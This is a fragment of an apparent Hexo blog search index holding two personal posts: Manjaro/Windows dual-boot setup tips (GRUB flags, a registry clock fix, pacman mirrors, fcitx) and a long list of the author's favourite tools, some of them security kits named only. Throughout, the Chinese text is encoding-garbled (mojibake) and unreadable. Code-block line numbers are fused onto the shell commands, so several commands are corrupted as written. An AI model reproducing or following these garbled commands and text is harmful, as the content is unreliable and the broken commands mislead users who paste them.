2.æ¸¸æˆæœ¬ï¼Œä¹Ÿå°±æ˜¯åŒæ˜¾å¡çš„ç”µè„‘ï¼Œéœ€è¦å±è”½ä¸‹ç‹¬æ˜¾æ‰èƒ½è¿›å…¥ä¸Šè¿°å›¾å½¢åŒ–å®‰è£…ç•Œé¢ï¼Œæ–¹æ³•éƒ½ä¸€æ ·ï¼Œä¿®æ”¹å¼•å¯¼é…ç½®ï¼Œdrive=åŽé¢çš„å€¼ä¿®æ”¹ä¸ºintel å®‰è£…åŽéœ€è¦ä¿®æ”¹grub.cfgæ–‡ä»¶ï¼Œä¿®æ”¹æ¯é¡¹å¯åŠ¨å¼•å¯¼é…ç½®ï¼Œåœ¨bootå‚æ•°åŽæ·»åŠ nouveau.modeset=0å‚æ•°,è§£å†³lspciå‘½ä»¤é˜»å¡žçš„é—®é¢˜,è¿™æ˜¯é€šæ³•ã€‚ 3.é‡å¯åŽè¿›æ­¥äº†linuxï¼Œå³å¼•å¯¼é—®é¢˜ã€‚è¿›å…¥biosæŸ¥çœ‹bootå¼•å¯¼æ–¹å¼ï¼Œå¦‚æžœæ˜¯legacyï¼Œå»ºè®®æ¢æˆUEFIï¼Œå¯èƒ½éœ€è¦é‡æ–°è£…æœºå“¦ï¼ŒçŽ°åœ¨çš„ç”µè„‘ä¸€èˆ¬éƒ½æ˜¯é»˜è®¤æ”¯æŒUEFIçš„ï¼Œå®ƒçš„å¼•å¯¼ç®¡ç†è¿˜æ˜¯å¾ˆèˆ’é€‚çš„ï¼Œå¯¹äºŽè£…å¤šç³»ç»Ÿçš„äººæ¯”è¾ƒå‹å¥½ï¼Œå¦‚æžœä½ æ‰§æ„ä½¿ç”¨ä¼ ç»Ÿçš„å¼•å¯¼æ–¹å¼ï¼Œå»ºè®®é‡æ–°å®‰è£…manjaroï¼Œå¹¶åœ¨å®‰è£…é€‰é¡¹ä¸­ï¼Œæ‰¾åˆ°å¼•å¯¼å®‰è£…é€‰é¡¹ï¼Œå®‰è£…åˆ°ä¸Žä½ windowsç³»ç»Ÿï¼Œå³é»˜è®¤å¼•å¯¼ç›˜ç›¸åŒçš„ç¡¬ç›˜ä¸Šï¼Œé‡å¯åŽä½ å°±èƒ½é¡ºåˆ©è¿›å…¥manjaroçš„grubå¼•å¯¼ç•Œé¢äº† 4.Linuxä¸ŽWindowsåŒç³»ç»Ÿæ—¶é—´é”™ä¹±é—®é¢˜è§£å†³æ–¹æ³• WindowsæŠŠç³»ç»Ÿç¡¬ä»¶æ—¶é—´å½“ä½œæœ¬åœ°æ—¶é—´(local time)ï¼Œå³æ“ä½œç³»ç»Ÿä¸­æ˜¾ç¤ºçš„æ—¶é—´è·ŸBIOSä¸­æ˜¾ç¤ºçš„æ—¶é—´æ˜¯ä¸€æ ·çš„ã€‚ Linux/Unix/MacæŠŠç¡¬ä»¶æ—¶é—´å½“ä½œUTCï¼Œæ“ä½œç³»ç»Ÿä¸­æ˜¾ç¤ºçš„æ—¶é—´æ˜¯ç¡¬ä»¶æ—¶é—´ç»è¿‡æ¢ç®—å¾—æ¥çš„ï¼Œæ¯”å¦‚è¯´åŒ—äº¬æ—¶é—´æ˜¯GMT+8ï¼Œåˆ™ç³»ç»Ÿä¸­æ˜¾ç¤ºæ—¶é—´æ˜¯ç¡¬ä»¶æ—¶é—´+8ã€‚è€ŒWindowsæ˜¾ç¤ºçš„æ˜¯ç¡¬ä»¶æ—¶é—´ï¼Œæ‰€ä»¥ä¸¤ä¸ªæ—¶é—´ä¼šå‘ç”Ÿé”™ä¹±ã€‚ åœ¨ Windows æŠŠç¡¬ä»¶æ—¶é—´å½“ä½œ UTCå¼€ å§‹-&gt;è¿è¡Œ-&gt;CMDï¼Œæ‰“å¼€å‘½ä»¤è¡Œç¨‹åº(ä»¥ç®¡ç†å‘˜æ–¹å¼æ‰“å¼€å‘½ä»¤è¡Œç¨‹åºæ–¹å¯æœ‰æƒé™è®¿é—®æ³¨å†Œè¡¨)ï¼Œåœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥ä¸‹é¢å‘½ä»¤å¹¶å›žè½¦ 1Reg add HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation /v RealTimeIsUniversal /t REG_DWORD /d 1 å®‰è£…åŽçš„é…ç½®1.å®‰è£…åŽå°±å¯ä»¥å…ˆé…ç½®å›½å†…çš„è½¯ä»¶æºã€‚ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼Œç”Ÿæˆå¯ç”¨ä¸­å›½é•œåƒç«™åˆ—è¡¨ï¼š 1sudo pacman-mirrors -i -c China -m rank å‹¾é€‰pingæœ€ä½Žçš„å°±å¥½äº† 2.åœ¨ /etc/pacman.confæ–‡ä»¶æœ«å°¾æ·»åŠ ä¸€ä¸‹ä¸¤è¡Œ: 12[archlinuxcn]Server = https://mirrors.ustc.edu.cn/archlinuxcn/$arch 3.å®‰è£…archlinuxcn-keyring: 12sudo pacman -S archlinuxcn-keyringsudo pacman -Syu 4.ä¿®æ”¹Homeä¸‹çš„ç›®å½•ä¸ºè‹±æ–‡ ä¿®æ”¹ç›®å½•æ˜ å°„æ–‡ä»¶åï¼›1vim ~/.config/user-dirs.dirs ä¿®æ”¹ä¸ºä»¥ä¸‹å†…å®¹ï¼š 12345678XDG_DESKTOP_DIR="$HOME/Desktop"XDG_DOWNLOAD_DIR="$HOME/Download"XDG_TEMPLATES_DIR="$HOME/Templates"XDG_PUBLICSHARE_DIR="$HOME/Public"XDG_DOCUMENTS_DIR="$HOME/Documents"XDG_MUSIC_DIR="$HOME/Music"XDG_PICTURES_DIR="$HOME/Pictures"XDG_VIDEOS_DIR="$HOME/Videos" å°†Homeç›®å½•ä¸‹çš„ä¸­æ–‡ç›®å½•åæ”¹ä¸ºå¯¹åº”çš„ä¸­æ–‡åï¼› 123456789cd ~mv å…¬å…± Publicmv æ¨¡æ¿ Templatesmv è§†é¢‘ Videosmv å›¾ç‰‡ Picturesmv æ–‡æ¡£ Documentsmv ä¸‹è½½ Downloadmv éŸ³ä¹ Musicmv æ¡Œé¢ Desktop 5.å®‰è£…æœç‹—æ‹¼éŸ³ 123sudo pacman -S fcitx-im #é»˜è®¤å…¨éƒ¨å®‰è£…sudo pacman -S fcitx-configtoolsudo pacman -S fcitx-sogoupinyin æ–°å»º~/.xprofileæ–‡ä»¶ï¼ŒåŠ å…¥å¦‚ä¸‹å†…å®¹123export GTK_IM_MODULE=fcitxexport QT_IM_MODULE=fcitxexport XMODIFIERS="@im=fcitx" é‡å¯åŽç”Ÿæ•ˆ å®‰è£…å¸¸ç”¨è½¯ä»¶å…ˆä»‹ç»å‡ æ¡pacmançš„å¸¸ç”¨å‘½ä»¤ 123456789pacman -S #å®‰è£…pacman -Syu #æ›´æ–°æºå¹¶å®‰è£…pacman -U #å®‰è£…æœ¬åœ°çš„åŒ…pacman -Sc #æ¸…ç†ç¼“å­˜pacman -R #å¸è½½ sudo pacman -S google-chrome sudo pacman -S firefox firefox-i18n-zh-cn sudo pacman -S pycharm sudo pacman -S yaourt sudo pacman -S git sudo pacman -S netease-cloud-music sudo pacman -S xflux-gui-git sudo pacman -S file-roller unrar unzip p7zip yaourt -S wps-office sudo pacman -S visual-studio-code-bin sudo pacman -S flameshot å¦å¤–è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æžœä½ ä½¿ç”¨ssrï¼Œéœ€è¦åœ¨ç½‘ç»œè¿žæŽ¥è®¾ç½®å…¨å±€ä»£ç†ï¼Œå¦åˆ™ç»ˆç«¯å’Œæµè§ˆå™¨æ— æ³•èµ°ä»£ç†ä¸Šç½‘ï¼Œåˆæˆ–è€…æ—¥å¸¸ä½¿ç”¨chromeçš„switchyOmegaæ’ä»¶æ¥å®žçŽ°pacä»£ç†ã€‚è¿˜æœ‰ä¸€ç‚¹ï¼Œå› ä¸ºæˆ‘å•çº¯åªæ˜¯ç”¨æ¥å­¦ä¹ äºŒè¿›åˆ¶çš„ï¼Œæ‰€ä»¥æ²¡æœ‰ä¸€ç›´çº ç»“äºŽVMwareå·¥ä½œç«™æ— æ³•æ­£å¸¸ä½¿ç”¨çš„é—®é¢˜ï¼Œä¹Ÿå°è¯•è§£å†³è¿‡ï¼Œä½†æ˜¯ç½‘ç»œä¸Šçš„æ–¹æ³•è²Œä¼¼éƒ½è¿‡æ—¶äº†ï¼Œwikiä¹Ÿæ²¡æœ‰å†æ›´æ–°ï¼ŒVMå®˜æ–¹ä¹Ÿè¡¨ç¤ºä¸æ”¯æŒarchï¼Œso å¦‚æžœä½ éœ€è¦ç”¨åˆ°è¿™ä¸ªå·¥ä½œç«™ï¼Œæœ€å¥½åˆ«å…¥å‘ðŸ˜‰]]></content>
      <categories>
        <category>éšç¬”</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>manjaro</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tools recode]]></title>
    <url>%2F2019%2F04%2F07%2FTools-recode%2F</url>
    <content type="text"><![CDATA[æ°¸ä¹…æ›´æ–°âœ”ä¿®æ”¹æ—¶é—´æˆ³ï¼š2020/04/03 æµè§ˆå™¨ chrome OWASP Firefox(MantraPortable) MC Edge QQ Browser Firefox ç™¾åº¦äº‘ä¸‹è½½é“¾æŽ¥ç”Ÿæˆï¼ˆå®šåˆ¶ç‰ˆï¼‰#æ²¹çŒ´è„šæœ¬å¯æ›¿ä»£ Firefox Developer Firefoxæ¸—é€ç‰ˆ Tor Browser ç³»ç»Ÿ manjaro linux ï¼ˆç¬¬äºŒç³»ç»Ÿï¼‰ windows 10 ubuntu 18.04 for pwn(è™šæ‹Ÿæœº) kali linux (è™šæ‹Ÿæœº) 52pojie XP (è™šæ‹Ÿæœº) commandoVMï¼ˆè™šæ‹Ÿæœºï¼‰ ubuntu _ wooyun (è™šæ‹Ÿæœºé•œåƒç«™) xuanjian3.0ï¼ˆwin10è™šæ‹Ÿæœºï¼‰ Linuxå·¥å…· electron-ssr flameshot â€“æˆªå± ç³»ç»Ÿä¼˜åŒ– TranslucentTB - windowsä»»åŠ¡æ é€æ˜ŽåŒ– Wallpaper Engine - æ¡Œé¢åŠ¨æ€å£çº¸-è‰¯å¿ƒ WindowsFX 6 - ç³»ç»Ÿçª—å£åŠ¨ç”»ä¿®æ”¹ã€æ¡Œé¢å›¾æ ‡ä¼˜åŒ– ä¼˜æ•ˆæ—¥åŽ† â€”ä¸­å›½äººçš„æ¡Œé¢æ—¥åŽ†ï¼ˆä»£æ›¿win10è‡ªå¸¦ï¼‰ Dism++ â€“win10ç³»ç»Ÿå¿«é€Ÿä¼˜åŒ–å·¥å…· TrafficMonitor â€“ä»»åŠ¡æ ç½‘é€Ÿ Core Temp â€“CPUæ¸©åº¦çŠ¶æ€ QuickLook â€”ä»¿iosç©ºæ ¼é¢„è§ˆ Fences â€“æ¡Œé¢ç®¡ç†å·¥å…· ç«ç»’å®‰å…¨- ç³»ç»Ÿä¼˜åŒ– Advanced SystemCare -å•†åŠ¡ç³»ç»Ÿä¼˜åŒ–-å¼¥è¡¥ç«ç»’ä¸è¶³ Scoop - windowsè½¯ä»¶åŒ…ç®¡ç† é«˜æ•ˆå·¥å…· Bandicamâ€“å½•å± AQå½•åˆ¶ â€“æ¸¸æˆå½•åˆ¶ Open Broadcaster Software Carnac -é”®ç›˜è¾“å…¥å¯è§†åŒ– PDF-XChange Viewer itools â€“ ipadæŠ•å±æ¼”ç¤º CamtasiaStudio â€“é«˜çº§å½•å± OneNote â€“MSè‰¯å¿ƒä¹‹ä½œ GitNoteâ€“åŸºäºŽgitçš„äº‘ç¬”è®° #å·²å¼ƒ Typora â€“Markdownç¼–è¾‘å™¨è½»é‡çº§ï¼Œé€‚åˆé˜…è¯»ï¼ŒUIå¾ˆèˆ’æœ Vnote - è·¨å¹³å°ä¸”æ˜¯ä¸€ä¸ªå—Vimå¯å‘çš„æ›´æ‡‚ç¨‹åºå‘˜å’ŒMarkdownçš„ç¬”è®°è½¯ä»¶ Ditto â€“ å‰ªè´´æ¿ç¥žå™¨ Quicker - æ‡’äººç¥žå™¨ï¼ˆç‹—å¤´ï¼‰ Utools - é«˜æ•ˆå·¥å…·ç›’/å¿«é€Ÿå¯åŠ¨-å–ä»£wox Eagle â€“å›¾ç‰‡ç®¡ç†å·¥å…·ï¼ˆè®¾è®¡å¸ˆä¸“ç”¨ï¼‰ PicGo â€“æœ€å¥½ç”¨çš„å›¾ç‰‡ä¸Šä¼ å·¥å…·ï¼ˆæ”¯æŒå¾®åšã€github(éœ€æŒ‚ä»£ç†)ç­‰å„å¤§ä¸»æµå›¾åºŠï¼‰# uPic â€“ macosæœ€å¥½ç”¨çš„å›¾åºŠå·¥å…·(githubå›¾åºŠå¯ç”¨cdnåŠ é€Ÿ) xmind8 â€“æ€ç»´å¯¼å›¾ xmind ZEN â€“ç®€çº¦å¤§æ°”ä¸“æ³¨ï¼ˆåŒä¸Šï¼‰ Freemind â€“ æ€ç»´å¯¼å›¾åˆ¶ä½œï¼ˆè¶…ç®€çº¦é£Žï¼‰ ScreenToGif â€“gifå½•åˆ¶ Mweb â€“OS markdownç¼–è¾‘å™¨ï¼ˆåšå®¢ç¥žå™¨ï¼‰ å°ä¹¦åŒ  â€“ ç›®å‰åœ¨ä½¿ç”¨çš„markdownç¼–è¾‘å™¨ï¼ˆæŽ¨èï¼‰ é…åˆæœ¬åœ°onedrive è¿›è¡Œäº‘åŒæ­¥ï¼Œç”¨æ¥è®°å½•æ—¥å¸¸å­¦ä¹ ç¬”è®° Markdownç¼–è¾‘å™¨å¥½åå–å†³äºŽå›¾ç‰‡ä¸Šä¼ åŠŸèƒ½ Sourcetree (å›¾å½¢åŒ–gitç®¡ç†å·¥å…·) Drawboard PDFé˜…è§ˆå™¨ SumatraPDF â€“åŒä¸Šï¼Œæžè‡´è½»ç®€ï¼ŒåŠŸèƒ½å¼ºå¤§ Adobe PDF pro â€”å¯ç¼–è¾‘ åŠŸèƒ½å¼ºå¤§ xdisplay â€“ipadæ‹“å±•å±å·¥å…· çŸ³å¢¨æ–‡æ¡£ â€“ç±»ä¼¼è…¾è®¯åŠžå…¬ å¹•å¸ƒ â€“å…·å¤‡æ€ç»´å¯¼å›¾åŠŸèƒ½çš„ç¬”è®°è½¯ä»¶ hexo â€”éžå¸¸ä¾¿æ·çš„æ­å»ºä¸€ä¸ªåšå®¢ï¼Œç®¡ç†èµ·æ¥ä¹Ÿå¾ˆæ–¹ä¾¿ gitbook â€”ç”Ÿæˆç”µå­ä¹¦æˆ–è€…åˆ†äº«é“¾æŽ¥ï¼Œç›®çš„æ€§è¾ƒå¼ºï¼Œå¯ç”¨äºŽåˆ›å»ºä¹¦ç±ï¼Œå…¬å…±æ–‡æ¡£ï¼Œä¼ä¸šæ‰‹å†Œï¼Œè®ºæ–‡ï¼Œç ”ç©¶è®ºæ–‡ç­‰ å°ç•ªèŒ„ â€”é«˜æ•ˆçš„æ—¶é—´ç®¡ç† Markpad 2 pro â€”mdè½¬htmlæ¸²æŸ“ VLOOK â€”typoraå¢žå¼ºåž‹æ’ä»¶ #å®¡ç¾Žä¸å¥½ å·²å¼ƒ pasteEX â€” ä¸€é”®ç²˜è´´å¹¶åˆ›å»ºå‰ªè´´æ¿å†…å®¹ä¸ºæ–‡ä»¶ EarTrumpet â€”ç®¡ç†ä¸åŒåº”ç”¨å£°éŸ³ Autohotkey â€“ å¼€æºè‡ªåŠ¨åŒ–è½¯ä»¶å·¥å…· å¸¸ç”¨æ¥è®¾ç½®å…¨å±€å¿«æ·é”®-æˆ‘çˆ±æ­»äº† Diskgenius Proâ€“winåˆ†åŒºç®¡ç†,æ™®é€šç‰ˆæ—¥å¸¸è¶³çŸ£ rufus â€“å¯åŠ¨ç›˜åˆ¶ä½œ win32Disklmager â€“åŒä¸Š source code proå­—ä½“ EagleGet â€“è§†é¢‘ä¸‹è½½å™¨ Q-Dir èµ„æºç®¡ç†å™¨å¤šçª—å£ç®¡ç† fliqloâ€“iOSç½‘çº¢æ—¶é’Ÿ Potplayer â€“è§†é¢‘æ’­æ”¾å™¨ BandZip 6.62ç»¿è‰²ä¾¿æºç‰ˆ SpeedTestâ€“å…¨çƒæƒå¨ç½‘é€Ÿæµ‹è¯• æ¬§è·¯è¯å…¸â€”ç®€çº¦å¥½ç”¨ï¼Œæ— å¹¿å‘Šï¼Œæ— ç»‘å®šæµè§ˆå™¨æ‰©å±• æ²™æ‹‰æŸ¥è¯ - chromeæ’ä»¶ é»‘è‹¹æžœ Clover Configurator MultiBeast Hackintool MaciASL é»‘æžœå°å…µ(hackintosh) Macos uPic AirServer eZip keka ShadowsocksX-NG Clipy Unclutter - å¤šåŠŸèƒ½å‰ªè´´æ¿(åŒ…æ‹¬å›¾ç‰‡) iStat Menus Mounty Dr.Cleaner VMware Fusion Motrix ç¼–è¯‘å™¨ Visual C++ 6.0 PyCharm Visual Studio 2015 IntelliJ IDEA PhpStorm PLC STEP 7 -MicroWIN STEP 7 -MicroWIN SMART TIA Portal V13 ç»ˆç«¯å·¥å…· ConEmu â€“ windows cmder â€“ windows Fluent Terminal Hyper Termux â€“ Android Termius Termius Î± æ•°æ®åº“ç®¡ç†å·¥å…· Navicat MySQL-Front dbeaver Tablepuls Azure Dat Studio â€“æ¯”SSMSè½»é‡ ç¼–è¾‘å™¨ Notepad++ sublime_text3 010 Editor BCompare â€“æ–‡ä»¶å·®å¼‚å¯¹æ¯” Visual Studio Code Atom â€“githubå‡ºå“ç¼–è¾‘å™¨ ä¸‹è½½å™¨ PanDownload SpeedPan ENFI FDM IDM qBittorrent è¿…é›·5 ç™¾åº¦äº‘ç›˜ æ²¹çŒ´ ç³»ç»Ÿå¼€æœºå¿…å¯ç”¨é¡¹ SSR/SS ç«ç»’å®‰å…¨ â€“å¿…å¤‡ Snipaste Quicker IDM Wallpaper Engine Utools Everything Autohotkey TrafficMonitorâ€“æµé‡ç›‘æŽ§ è¿œæŽ§ Teamview ä¼ä¸šç‰ˆ TeamView å¿«é€Ÿç‰ˆ xshell flashFXP putty finalshell MobaXterm å¤šåŠŸèƒ½ç»ˆç«¯ çŽ¯å¢ƒ Phpstudy_Pro VMware Workstation Pro 15 Java 8 Python 2/3 C node.js Git Hexo Gitbook Sec å·¥å…· å·¥å…·åŒ… pentestBox å¾çˆ±ç ´è§£å·¥å…·åŒ… å¿ƒä¸œ CTFtools pwntools æ‚¬å‰‘æ­¦å™¨åº“ åç¼–è¯‘ .Net Reflector+reflexil dnSpy ILspyTool åŠžå…¬Adobeç³»åˆ—ï¼š After Effects CC 2020 Photoshop CC 2020 Premiere Pro CC 2020 Adobe Audition CC 2020 Adobe Fireworks CS6 Adobe Lightroom Classic CC Adobe Media Encoder 2020 Resolveï¼ˆè¾¾èŠ¬å¥‡ï¼‰ Arctime pro Aegisub32 officeç³»åˆ—ï¼š Word PowerPoint Excel Visio Project Wpsï¼ˆæ”¿åºœç»¿è‰²ç‰ˆï¼‰ OfficeBoxä¸‡å½©åŠžå…¬ï¼ˆç»¿è‰²ç‰ˆï¼‰]]></content>
      <categories>
        <category>éšç¬”</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
</search>
